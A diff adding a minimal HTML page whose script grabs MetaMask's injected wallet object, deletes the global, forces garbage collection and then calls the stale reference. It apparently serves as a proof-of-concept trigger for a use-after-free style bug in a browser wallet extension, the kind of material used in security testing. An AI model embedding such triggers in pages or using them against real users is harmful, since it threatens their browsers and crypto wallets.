@@ -1,0 +1,17 @@
+<html>
+    <head>
+        <title>Home</title>
+    </head>
+    <body>
+<script>
+function triggergc() {
+  for (let i = 0; i < 100; i++) {
+    let a = new Array(1000000);
+  }
+}
+let uafobj = ethereum._metamask;
+delete ethereum;
+triggergc();
+console.log(uafobj.isUnlocked());
+</script>
+</html>
